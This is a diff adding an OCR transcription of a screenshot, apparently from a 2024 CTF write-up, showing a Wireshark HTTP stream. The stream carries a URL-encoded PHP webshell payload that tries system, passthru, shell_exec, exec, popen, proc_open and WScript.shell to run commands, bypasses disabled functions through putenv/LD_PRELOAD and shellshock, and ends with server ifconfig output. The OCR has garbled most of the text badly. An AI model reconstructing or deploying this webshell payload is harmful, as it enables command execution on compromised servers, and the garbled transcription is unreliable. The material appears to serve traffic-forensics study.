@@ -1,0 +1,53 @@
+# OCR: 979dfaa4199af8b01200b4a5dfb316a1.webp
+# 来源: .\02-WriteUp\2024\979dfaa4199af8b01200b4a5dfb316a1.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:17
+
+(Mi Wireshark - BES HTTP 3% (tep.stream eq .kdunpep =a
+eX7eRAGputenv (22PATHASOR22.getenv (X22PATHA22). R27RIBCRSARDFWindow=X2F system 2436 ASIN ndowsK2SysuGAXSECXSARDFin dows 3SBCRIARIFWindows3a Systems R2FindowsPowerShelLF A
+1. oX2r530822) 83087014 (empty (X24envstr))X7BX24envarrK3Dexp Lode %22X7CK7CKYC as] ineX7CR7CR7CK22A202OR2AeN vst )ASBFor each (X24envarrX200sK20K240 )X2OKTBL20( lempty (X28V) )K20K7S
+Hoputenv (str_replace 422% 7CXICKICaskey7C&7CKTCK22%2C%20%22XS0%22X2C20K28V) )X3BX7ORTOS7O%2ArKSOK22X7EX2 SpX7D%20%7E%24C7ORZZESBF unc ti onk20Fe(X26F) X7BK24AXSDexplode (322X282
+22CAOIns_ get (A22dEzabLe. Funct sonsk22) )S38iF empty (824d) A7EK24ALADArray ()ASERMDelzeX7OL2AGKIDarray wap( erin’ 42Carcay wap "strtolower X2CK24d) ){2870return Function existe
+k2aFyx26%261s_ callable (X28F) 826826! in_orray (X26*K2CR244) )¥3BX7ONSBFunctLonk2Orunshel shock K24éK2CX20R24c )X2OR7BLF¥20( subst (X24A2CK2OOK2CR201 )2OXSORIOK2OR2282PAZZDOR2ERZE
+{320fe("putenv")x20425%26820(fe( “error_log” )*2@x7CA7CAZOFe( ‘mail ')))A2@KTBLFADC (strstr (read ink(X22A2FbinK2F SHAD? )X2CA20K22bash822)%201XS0R2OFALSE)82OR7B42AtMPA2ORSON2ELeNprae
+(2ys_get_tenp_dir()X20420" as" )RSBputenv (22PHP _LOLXSD()K20K7BK20%420%20%70K38%20%24cX20K3EX2StpX202%3EK261N22) 4391 420(Fe( "error_log" ))X20K7Berror_log K22aX22K204201 )XSBX70%
+20e1se420470nai(£223%40127.0, 0. 2522%2C82082282 242042042242 220420422 -bvA22)XSEXTONTONZ0€ lse%20478returrX20F2 seXS8X7OX2outputX2OXSDX20WOFile get contents (X24tmp)XSE%40un]
+nk S24tmp 5304 #420 (X2doutputX20 82042082242 820479print (S24output JXBBreturnX2OTruekIBS7047Oreturnk20Fo].seXIBK7043E Funct sonk20runced (X28c)A7ERZRre NSDOLIDKLAEEDDA enone (24S
+ERVERNSOR22SCRIPT_FTLENANER22850) 8381 (Fe( system" ))$7B¥40sy stem( K24cKZCK24ret )XBBXIDEL self (Fe( “passthru’))¥7B¥Opassthru(S24cK2CK24r et) KIBK7Del seit (Fe(“shell_exec'))7Bprint
+(Gadshelt_exec %24c))"3887Del seit (Fe( exec”) ¥7BAABexec (X24CA2CA24OA2CADATet)ABBprint join (X22¥OAXDZA2CA240) )NSBLTDeL seit Fe('popen")) 78424" pX30M4Bpopen (X24cK2C'r")ASBuhtLe(
+{ofeot (Rzafp) 8 7Bprint (s40f gets (X24fp%2C2048) )X3BX7D¥40pc lose (824Fp)3BK7DeL sei (Fe(“proc_open’ ))XTBX2EpX2eR30%20¥4aproc_open (X24cK2CKZOarray (2X2BXSDESERZBIray “pipe” c
+* )32CA202%20430%3420array ("pipe 420420 w" ) )R2CK2K2AIO) LIBuhi Le( ISAOFeof (326i0¥SE14SD) )HEprint (A4GFgets (X28: 0XSB1450LIC2048) )AIBLOwhi le 1S40FeoF (X24io¥SE2XSD))¥7Bprint(
+Sssorgets(X28io¥se2Ks042C2046) )XSBK7OMOFc lose (424% 0KSB1KSD )XSEAOFc lose (24ioXSBZXSD)XBBKAOproe_close (K24p)XSEXTDeLseif(Fe( “antsy ten") )X7BXA0antsysten(K24e)SIBS7DELse8F (runs
+hel1shock (X24dk2Ck2e%24c))X20R7BreturnK2OK2sretX30X7Delselt subst (%X2dK2COR2C1) !XSON22K2FXZZA2OR2EX2GR2OWAOC Las5_exists (K22CONR22) X7BK2uASOneWA2OCON( "WSEript. shell” )X3OR24
+XBOX Au. XaEexec (Sc XSBKDASOASOADe-ADESEdOUt ()XBEXP4ret..XGOA2z0-A3EReadAl ]()KIBK2ATeKSOAME-XBEStdErr()RSEKDAFet .ADOA2AGe-K3EReadAl )A3Bprine(X2éret)XSERDELsekTORDAT ECR
+20830%820127838870returnB20%24retK3BR7ORSER24ret¥30%40r unced ($24r_$228202%3ER2ELN22) ¥38print¥20 24ret!¥300)XSP2ZretXSON7BR24r etS7OR2IAIARZIRINSBRSBN7OCAth (Except ions2OK24e
+)¥78echo§20%22€RRORKSAL2F2F%22,24e-A3EGetHCs sage RDBATONSBacoutput )¥S8die()SSEHTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 04 Nar 2022 07:19:10 GHT
+Content-Type: text/neml; charsetoUTF-8
+‘Teansfer-tncoding: chunked
+Connection: close
+Vary: Accept-Encoding
+BROADCAST, RUNNING,MULTICAST> mtu 1500
+de23:0f71 prefixlen 64 scopeid @x20clink>
+‘txqueuelen 1000 (Ethernet)
+RX packets 16207 bytes 16770765 (15.9 iB)
+RX errors @ dropped @ overruns © frame t
+1% packets 10891" bytes 19482928 (18.5 M8)
+‘TK errors © dropped @ overruns @ carrier @ collisions @
+Lo: fllags=73<UP, LOOPBACK, RUNING? mtu 65536
+inet 127.0.0.1 netmask 255.0.0.0
+inets 21 prefixlen 128 scopeid ex10chost>
+oop txquevelen i (Local Loopback)
+RX packets 72 bytes 6260 (6.1 KiB)
+RK errors @ dropped @ overruns @ frame 0
+TX packets 72 bytes 6260 (6.1 KiB)
+‘TK errors @ dropped © overruns @ carrier @ collisions @
+ofrdd
+‘/ratu/maaroot/men.tpshop.com/application
+‘dea75af74315
+bafades
+E
+a (6078 bytes) Show data as [ASCH f=]
+me ea)
+Ce 2 | 8 | ee 翔 略
